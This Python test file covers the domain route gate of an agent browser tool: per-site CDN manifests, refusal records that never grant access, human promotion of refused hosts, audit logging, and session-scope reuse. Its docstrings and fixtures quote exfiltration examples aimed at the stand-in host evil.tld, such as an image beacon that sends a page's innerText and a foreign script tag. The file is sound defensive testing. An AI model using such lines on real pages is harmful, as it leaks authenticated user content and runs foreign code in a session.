"""The route gate constrains both ends of a subresource, not just one.

The CDN passthrough was added so a site could load its own bundle from a
host the eTLD+1 allowlist never names. It constrained the initiating frame,
the method and the navigation flag — and nothing at all about the host being
contacted, which left a script inside an authenticated page free to send the
page out one GET at a time and to pull foreign code back in. These tests pin
the destination half: a host passes only when the site's manifest names it,
what is refused is recorded as evidence, and evidence authorises nothing.

They also pin the two session properties the gate depends on: it is installed
whether or not a scope was asked for, and a live session's scope cannot be
changed by the next caller reusing it.
"""
from __future__ import annotations

import json
import types

import pytest

from .conftest import TEST_DOMAIN


@pytest.fixture
def agent_home(tmp_path, monkeypatch):
    """DPC_HOME with an in-memory keyring, as the vault tests use."""
    monkeypatch.setenv("DPC_HOME", str(tmp_path))

    import keyring
    from keyring import backend

    class _MemKeyring(backend.KeyringBackend):
        priority = 1  # type: ignore[assignment]

        def __init__(self):
            self._store: dict[tuple[str, str], str] = {}

        def get_password(self, service, username):
            return self._store.get((service, username))

        def set_password(self, service, username, password):
            self._store[(service, username)] = password

        def delete_password(self, service, username):
            self._store.pop((service, username), None)

    previous = keyring.get_keyring()
    keyring.set_keyring(_MemKeyring())
    from dpc_client_core import web_auth

    web_auth.load_cdn_manifest(force=True)
    yield tmp_path
    keyring.set_keyring(previous)
    web_auth.load_cdn_manifest(force=True)


class _Route:
    """Route stub with every field the gate reads. Defaults describe a page
    asset, which is the request the passthrough is about."""

    def __init__(self, url, *, method="GET", resource_type="script",
                 nav=False, frame_url=None):
        frame = types.SimpleNamespace(url=frame_url) if frame_url else None
        self.request = types.SimpleNamespace(
            url=url,
            method=method,
            resource_type=resource_type,
            is_navigation_request=lambda: nav,
            frame=frame,
        )
        self.continued = False
        self.aborted = False

    def continue_(self):
        self.continued = True

    def abort(self):
        self.aborted = True


class _StubPage:
    url = f"https://{TEST_DOMAIN}/home"

    def is_closed(self):
        return False


def _audit_rows(home, agent_id="agent_a"):
    path = home / "agents" / agent_id / "web_audit.jsonl"
    if not path.exists():
        return []
    return [json.loads(line) for line in
            path.read_text(encoding="utf-8").splitlines() if line.strip()]


def _write_manifest(home, sites):
    from dpc_client_core import web_auth

    (home / "web_cdn_manifest.json").write_text(
        json.dumps({"sites": sites}), encoding="utf-8"
    )
    web_auth.load_cdn_manifest(force=True)


def _browser(domains=(f"{TEST_DOMAIN}",), agent_id="agent_a", **kwargs):
    from dpc_client_core.dpc_agent.tools.browser import AuthBrowser

    return AuthBrowser(agent_id=agent_id, domains=list(domains), **kwargs)


# ─────────────────────────────────────────────────────────────
# Destination ∈ manifest(site)
# ─────────────────────────────────────────────────────────────


def test_a_get_subresource_to_a_host_outside_the_manifest_is_blocked(agent_home):
    """The exfiltration shape the passthrough left open: a script in the
    authenticated page does `new Image().src = "https://evil.tld/?d=" +
    document.body.innerText`. GET, an image, not a navigation, initiated by
    an allowed frame — every condition the branch used to check."""
    ab = _browser()
    route = _Route(
        "https://evil.tld/?d=secret",
        resource_type="image",
        frame_url=f"https://{TEST_DOMAIN}/inbox",
    )
    ab._domain_route_gate(route)
    assert route.aborted is True
    assert route.continued is False
    assert ab._domain_blocks == 1


def test_foreign_script_cannot_be_pulled_into_an_authenticated_page(agent_home):
    """The inbound half of the same hole: `<script src="https://evil.tld/x.js">`
    is a GET non-navigation too, and passing it runs foreign code inside the
    origin holding the session cookies."""
    ab = _browser()
    route = _Route(
        "https://evil.tld/x.js",
        resource_type="script",
        frame_url=f"https://{TEST_DOMAIN}/inbox",
    )
    ab._domain_route_gate(route)
    assert route.aborted is True
    assert route.continued is False


def test_a_host_the_sites_manifest_names_passes(agent_home):
    _write_manifest(agent_home, {TEST_DOMAIN: ["static.example-cdn.net"]})
    ab = _browser()
    route = _Route(
        "https://static.example-cdn.net/main.js",
        frame_url=f"https://{TEST_DOMAIN}/home",
    )
    ab._domain_route_gate(route)
    assert route.continued is True
    assert route.aborted is False
    assert ab._domain_blocks == 0


def test_the_manifest_is_per_site_not_a_global_allowlist(agent_home):
    """A host approved for one site is not thereby approved for another —
    otherwise the first site a user approves widens the gate for all."""
    _write_manifest(agent_home, {"example.net": ["static.example-cdn.net"]})
    ab = _browser(domains=[TEST_DOMAIN, "example.net"])
    route = _Route(
        "https://static.example-cdn.net/main.js",
        frame_url=f"https://{TEST_DOMAIN}/home",
    )
    ab._domain_route_gate(route)
    assert route.aborted is True

    allowed = _Route(
        "https://static.example-cdn.net/main.js",
        frame_url="https://example.net/home",
    )
    ab._domain_route_gate(allowed)
    assert allowed.continued is True


def test_the_seed_lets_x_com_reach_the_three_twimg_hosts(agent_home):
    """Seeded in code so a fresh install renders x.com at all — the flow this
    gate was tightened around."""
    ab = _browser(domains=["x.com"])
    for host in ("abs.twimg.com", "pbs.twimg.com", "video.twimg.com"):
        route = _Route(f"https://{host}/asset", frame_url="https://x.com/home")
        ab._domain_route_gate(route)
        assert route.continued is True, host
    other = _Route(
        "https://ton.twimg.com/asset", frame_url="https://x.com/home"
    )
    ab._domain_route_gate(other)
    assert other.aborted is True


def test_an_unresolvable_manifest_host_admits_nothing(agent_home):
    """A malformed manifest must fail closed: this runs on the request path,
    and a typo in the file is not permission to reach everywhere."""
    (agent_home / "web_cdn_manifest.json").write_text("{ not json", encoding="utf-8")
    from dpc_client_core import web_auth

    web_auth.load_cdn_manifest(force=True)
    ab = _browser()
    route = _Route(
        "https://static.example-cdn.net/main.js",
        frame_url=f"https://{TEST_DOMAIN}/home",
    )
    ab._domain_route_gate(route)
    assert route.aborted is True


# ─────────────────────────────────────────────────────────────
# Refusals: evidence, never permission
# ─────────────────────────────────────────────────────────────


def test_a_refused_destination_is_recorded_with_first_seen_and_a_count(agent_home):
    from dpc_client_core import web_auth

    ab = _browser()
    for _ in range(3):
        route = _Route(
            "https://static.example-cdn.net/main.js",
            frame_url=f"https://{TEST_DOMAIN}/home",
        )
        ab._domain_route_gate(route)
    ab._flush_gate_audit()

    refused = web_auth.load_cdn_refusals("agent_a")
    entry = refused[TEST_DOMAIN]["static.example-cdn.net"]
    assert entry["count"] == 3
    assert entry["first_seen"]


def test_a_refusal_does_not_itself_authorise_the_host(agent_home):
    """The property the two-file split exists for. After the gate has
    recorded a refusal, the very next request to that host is still
    refused — the gate reads the manifest and never the refusals."""
    from dpc_client_core import web_auth

    ab = _browser()
    first = _Route(
        "https://static.example-cdn.net/a.js",
        frame_url=f"https://{TEST_DOMAIN}/home",
    )
    ab._domain_route_gate(first)
    assert web_auth.load_cdn_refusals("agent_a")[TEST_DOMAIN]

    again = _browser()
    second = _Route(
        "https://static.example-cdn.net/b.js",
        frame_url=f"https://{TEST_DOMAIN}/home",
    )
    again._domain_route_gate(second)
    assert second.aborted is True
    assert second.continued is False


def test_only_a_promotion_turns_a_refusal_into_permission(agent_home):
    """The one-click "x.com wants 6 domains — allow?" lands in
    `promote_cdn_refusals`, and nothing else grants."""
    from dpc_client_core import web_auth

    ab = _browser()
    ab._domain_route_gate(_Route(
        "https://static.example-cdn.net/a.js",
        frame_url=f"https://{TEST_DOMAIN}/home",
    ))
    assert ab._domain_blocks == 1

    web_auth.promote_cdn_refusals(TEST_DOMAIN, ["static.example-cdn.net"])

    after = _browser()
    route = _Route(
        "https://static.example-cdn.net/b.js",
        frame_url=f"https://{TEST_DOMAIN}/home",
    )
    after._domain_route_gate(route)
    assert route.continued is True


def test_a_promotion_grants_only_the_hosts_it_was_handed(agent_home):
    """The human approves what they were shown; a refusal that arrived
    between the render and the click is not part of that answer."""
    from dpc_client_core import web_auth

    ab = _browser()
    for host in ("static.example-cdn.net", "beacon.example-cdn.net"):
        ab._domain_route_gate(_Route(
            f"https://{host}/x.js", frame_url=f"https://{TEST_DOMAIN}/home",
        ))
    web_auth.promote_cdn_refusals(TEST_DOMAIN, ["static.example-cdn.net"])

    assert web_auth.cdn_manifest_hosts(TEST_DOMAIN) == frozenset(
        {"static.example-cdn.net"}
    )
    route = _Route(
        "https://beacon.example-cdn.net/x.js",
        frame_url=f"https://{TEST_DOMAIN}/home",
    )
    _browser()._domain_route_gate(route)
    assert route.aborted is True


def test_the_refusals_live_outside_the_manifest_the_gate_reads(agent_home):
    """Different files by construction: the authority sits at node level,
    outside every agent's sandbox root, and the evidence beside the audit
    log the agent may read."""
    from dpc_client_core import web_auth

    manifest = web_auth.cdn_manifest_path()
    refusals = web_auth.cdn_refusals_path("agent_a")
    assert manifest != refusals
    assert manifest.parent == agent_home
    assert refusals.parent == agent_home / "agents" / "agent_a"
    assert refusals.parent == web_auth.audit_path("agent_a").parent


def _write_legacy(web_auth, agent_id, sites):
    path = web_auth.cdn_refusals_legacy_path(agent_id)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps({"sites": sites}), encoding="utf-8")
    return path


def test_a_file_left_under_the_pre_rename_name_is_still_read(agent_home):
    """The record exists to be promoted from by a human. A rename that made
    an existing one unreadable would throw away exactly that."""
    from dpc_client_core import web_auth

    _write_legacy(web_auth, "agent_a", {
        TEST_DOMAIN: {"static.example-cdn.net": {
            "first_seen": "2026-09-01T00:00:00Z", "last_seen":
            "2026-09-02T00:00:00Z", "count": 4, "reasons": {"unlisted": 4},
        }},
    })
    assert not web_auth.cdn_refusals_path("agent_a").exists()

    entry = web_auth.load_cdn_refusals("agent_a")[TEST_DOMAIN]
    assert entry["static.example-cdn.net"]["count"] == 4


def test_the_next_refusal_carries_the_old_file_forward_and_leaves_it_alone(agent_home):
    """Migration happens on the first write, not on read, and `first_seen`
    survives it — the field that answers "since when" is the one a human
    judges the host by. The old file stays: deleting a user's record is not
    this code's business."""
    from dpc_client_core import web_auth

    legacy = _write_legacy(web_auth, "agent_a", {
        TEST_DOMAIN: {"static.example-cdn.net": {
            "first_seen": "2026-09-01T00:00:00Z", "last_seen":
            "2026-09-02T00:00:00Z", "count": 4, "reasons": {"unlisted": 4},
        }},
    })
    legacy_bytes = legacy.read_bytes()

    web_auth.record_cdn_refusals(
        "agent_a",
        [(TEST_DOMAIN, "static.example-cdn.net", 1,
          web_auth.REFUSAL_REASON_UNLISTED)],
    )

    current = web_auth.cdn_refusals_path("agent_a")
    assert current.exists()
    entry = json.loads(current.read_text(encoding="utf-8"))["sites"]
    entry = entry[TEST_DOMAIN]["static.example-cdn.net"]
    assert entry["count"] == 5
    assert entry["first_seen"] == "2026-09-01T00:00:00Z"
    assert entry["reasons"] == {"unlisted": 5}
    assert legacy.read_bytes() == legacy_bytes


def test_the_current_file_wins_over_the_one_the_rename_left_behind(agent_home):
    """Both on disk after a migration. Reading the old one back would resurrect
    counts the current file has already folded in."""
    from dpc_client_core import web_auth

    _write_legacy(web_auth, "agent_a", {
        TEST_DOMAIN: {"stale.example-cdn.net": {"count": 9}},
    })
    web_auth.record_cdn_refusals(
        "agent_a", [(TEST_DOMAIN, "fresh.example-cdn.net", 1)]
    )

    sites = web_auth.load_cdn_refusals("agent_a")[TEST_DOMAIN]
    assert "fresh.example-cdn.net" in sites
    assert "stale.example-cdn.net" in sites  # folded forward by the write
    assert sites["stale.example-cdn.net"]["count"] == 9


# ─────────────────────────────────────────────────────────────
# The audit row says who asked, for what, and how
# ─────────────────────────────────────────────────────────────


def test_a_passthrough_row_names_initiator_destination_method_and_kind(agent_home):
    """For a passthrough the security-relevant fact is who initiated it, and
    the initiating frame was exactly what the row did not carry."""
    _write_manifest(agent_home, {TEST_DOMAIN: ["static.example-cdn.net"]})
    ab = _browser()
    ab._domain_route_gate(_Route(
        "https://static.example-cdn.net/main.js",
        method="GET", resource_type="script",
        frame_url=f"https://{TEST_DOMAIN}/inbox",
    ))
    row = next(r for r in _audit_rows(agent_home)
               if r["action"] == "subresource_passthrough")
    assert row["initiator"] == f"https://{TEST_DOMAIN}/inbox"
    assert row["dest_host"] == "static.example-cdn.net"
    assert row["method"] == "GET"
    assert row["resource_type"] == "script"
    assert row["site"] == TEST_DOMAIN


def test_a_block_row_names_initiator_destination_method_and_kind(agent_home):
    ab = _browser()
    ab._domain_route_gate(_Route(
        "https://evil.tld/",
        method="GET", resource_type="document", nav=True,
        frame_url=f"https://{TEST_DOMAIN}/inbox",
    ))
    row = next(r for r in _audit_rows(agent_home)
               if r["action"] == "domain_blocked")
    assert row["initiator"] == f"https://{TEST_DOMAIN}/inbox"
    assert row["dest_host"] == "evil.tld"
    assert row["method"] == "GET"
    assert row["resource_type"] == "document"
    assert row["result"] == "denied"


def test_refused_as_unlisted_is_distinguishable_from_refused_outright(agent_home):
    """One is a site asking for a host it plausibly needs; the other is
    something trying to leave. An audit that spelled them the same way would
    make the first drown the second."""
    ab = _browser()
    ab._domain_route_gate(_Route(
        "https://static.example-cdn.net/main.js",
        frame_url=f"https://{TEST_DOMAIN}/home",
    ))
    ab._domain_route_gate(_Route(
        "https://evil.tld/", resource_type="document", nav=True,
        frame_url=f"https://{TEST_DOMAIN}/home",
    ))
    actions = [r["action"] for r in _audit_rows(agent_home)]
    assert "subresource_blocked_unlisted" in actions
    assert "domain_blocked" in actions


def test_repeats_are_coalesced_but_the_first_one_is_always_written(agent_home):
    """Hundreds of identical rows per page load buried the ones the audit
    exists for. The first occurrence still lands immediately — a count that
    only arrives at close cannot say when a host first appeared."""
    _write_manifest(agent_home, {TEST_DOMAIN: ["static.example-cdn.net"]})
    ab = _browser()
    for i in range(25):
        ab._domain_route_gate(_Route(
            f"https://static.example-cdn.net/chunk-{i}.js",
            frame_url=f"https://{TEST_DOMAIN}/home",
        ))
    rows = [r for r in _audit_rows(agent_home)
            if r["action"] == "subresource_passthrough"]
    assert len(rows) == 1
    assert rows[0]["first_seen"] is True

    ab._flush_gate_audit()
    summary = [r for r in _audit_rows(agent_home)
               if r["action"] == "subresource_passthrough_summary"]
    assert len(summary) == 1
    assert summary[0]["count"] == 25


def test_a_second_destination_gets_its_own_first_seen_row(agent_home):
    """Coalescing keys on the destination, so a new host is never folded
    into a count that is already running."""
    _write_manifest(
        agent_home, {TEST_DOMAIN: ["a.example-cdn.net", "b.example-cdn.net"]}
    )
    ab = _browser()
    for host in ("a.example-cdn.net", "a.example-cdn.net", "b.example-cdn.net"):
        ab._domain_route_gate(_Route(
            f"https://{host}/x.js", frame_url=f"https://{TEST_DOMAIN}/home",
        ))
    hosts = {r["dest_host"] for r in _audit_rows(agent_home)
             if r["action"] == "subresource_passthrough"}
    assert hosts == {"a.example-cdn.net", "b.example-cdn.net"}


def test_the_audit_log_rotates_instead_of_growing_without_bound(agent_home):
    from dpc_client_core import web_auth

    path = web_auth.audit_path("agent_a")
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(b"x" * (web_auth.WEB_AUDIT_MAX_BYTES + 1))
    web_auth.log_browser_action("agent_a", "example.net", "probe", "https://x/")

    assert path.stat().st_size < web_auth.WEB_AUDIT_MAX_BYTES
    assert path.with_suffix(".jsonl.1").exists()


def test_an_audit_failure_never_changes_the_gates_decision(agent_home, monkeypatch):
    from dpc_client_core import web_auth

    def _boom(*a, **k):
        raise OSError("disk full")

    monkeypatch.setattr(web_auth, "log_browser_action", _boom)
    _write_manifest(agent_home, {TEST_DOMAIN: ["static.example-cdn.net"]})
    ab = _browser()
    route = _Route(
        "https://static.example-cdn.net/main.js",
        frame_url=f"https://{TEST_DOMAIN}/home",
    )
    ab._domain_route_gate(route)
    assert route.continued is True

    blocked = _Route("https://evil.tld/x.js", frame_url=f"https://{TEST_DOMAIN}/home")
    ab._domain_route_gate(blocked)
    assert blocked.aborted is True


# ─────────────────────────────────────────────────────────────
# Every session has a gate, and no reuse widens one
# ─────────────────────────────────────────────────────────────


class _FakeContext:
    def __init__(self):
        self.registered = []

    def route(self, pattern, handler):
        self.registered.append((pattern, handler))


def test_a_session_opened_with_no_use_auth_still_installs_a_gate(agent_home):
    """`browse_page(keep_open=True)` without `use_auth` asks for `domains=[]`,
    and the handler used to return before registering anything."""
    ab = _browser(domains=[])
    ab._context = _FakeContext()
    ab._install_domain_route_handler()
    assert [p for p, _ in ab._context.registered] == ["**/*"]


def test_an_unscoped_session_carries_no_saved_identity(agent_home):
    """Chosen meaning of an empty scope: nothing is enforced, so nothing is
    carried. The alternative reading — deny everything — would leave the
    anonymous fetch browser and headed no-auth browsing with no way to work
    at all; this one removes what made an ungated session dangerous."""
    ab = _browser(domains=[])
    assert ab._open_scope is True
    assert ab._start_clean is True


def test_a_scoped_session_still_loads_its_saved_identity(agent_home):
    ab = _browser()
    assert ab._open_scope is False
    assert ab._start_clean is False


def test_an_unscoped_session_does_not_overwrite_the_saved_browser_state(agent_home):
    """It stopped reading browser_state.json, so it must stop writing it —
    otherwise the first unscoped browse empties every login the agent had."""
    state = agent_home / "agents" / "agent_a" / "browser_state.json"
    state.parent.mkdir(parents=True, exist_ok=True)
    state.write_text('{"cookies": [{"name": "keep"}], "origins": []}', encoding="utf-8")

    ab = _browser(domains=[])
    ab._context = object()  # would raise if the save path ran
    ab._persist_session_cookies()

    assert json.loads(state.read_text(encoding="utf-8"))["cookies"][0]["name"] == "keep"


def test_reuse_cannot_widen_an_unscoped_session_into_an_authenticated_one(
    agent_home, monkeypatch
):
    """A live `domains=[]` session was handed to a later `use_auth` call,
    which then browsed a named site through a gate that enforced nothing."""
    from dpc_client_core.dpc_agent.tools import browser as b

    monkeypatch.setattr(
        b.AuthBrowser, "start", lambda self: setattr(self, "_page", _StubPage())
    )
    unscoped = _browser(domains=[])
    unscoped._page = _StubPage()
    b._active_browser_sessions["agent_a"] = unscoped
    try:
        got = b._get_or_create_session("agent_a", [TEST_DOMAIN], True)
        assert got is not unscoped
        assert got._etld1s == {TEST_DOMAIN}
    finally:
        b._active_browser_sessions.pop("agent_a", None)


def test_reuse_cannot_hand_an_authenticated_session_to_an_unscoped_call(
    agent_home, monkeypatch
):
    """The other direction: a plain `browse_page(keep_open=True)` must not
    inherit the cookies of a session someone opened for a named site."""
    from dpc_client_core.dpc_agent.tools import browser as b

    monkeypatch.setattr(
        b.AuthBrowser, "start", lambda self: setattr(self, "_page", _StubPage())
    )
    scoped = _browser()
    scoped._page = _StubPage()
    b._active_browser_sessions["agent_a"] = scoped
    try:
        got = b._get_or_create_session("agent_a", [], True)
        assert got is not scoped
        assert got._open_scope is True
    finally:
        b._active_browser_sessions.pop("agent_a", None)


def test_reuse_keeps_the_session_when_the_scope_is_the_same(agent_home, monkeypatch):
    """The duplicate-open guard is the reason reuse exists; narrowing it to
    an exact scope match must not cost a second Camoufox per tool call."""
    from dpc_client_core.dpc_agent.tools import browser as b

    def _explode(self):
        raise AssertionError("a matching scope must reuse, not launch")

    monkeypatch.setattr(b.AuthBrowser, "start", _explode)
    scoped = _browser()
    scoped._page = _StubPage()
    b._active_browser_sessions["agent_a"] = scoped
    try:
        assert b._get_or_create_session("agent_a", [f"www.{TEST_DOMAIN}"], True) is scoped
    finally:
        b._active_browser_sessions.pop("agent_a", None)


def test_a_scope_that_resolves_to_nothing_is_not_the_unscoped_session(agent_home):
    """`domains=["com"]` asked for a scope and got none of it. Reading that
    as "no scope requested" would turn a typo into an open browser."""
    from dpc_client_core.dpc_agent.tools.browser import _requested_scope

    assert _requested_scope([]) is None
    assert _requested_scope(["com"]) == frozenset()
    assert _requested_scope([]) != _requested_scope(["com"])

    ab = _browser(domains=["com"])
    assert ab._open_scope is False
    route = _Route(f"https://{TEST_DOMAIN}/x", nav=True, resource_type="document")
    ab._domain_route_gate(route)
    assert route.aborted is True


def test_the_pre_navigation_check_agrees_with_the_gate_on_an_unresolved_scope(
    agent_home,
):
    """The convenience layer let `domains=["com"]` navigate anywhere while
    the gate denied everything; two layers disagreeing is how a hole hides."""
    ab = _browser(domains=["com"])
    ab._page = object()
    with pytest.raises(ValueError, match="outside auth domains"):
        ab._check_domain(f"https://{TEST_DOMAIN}/x")
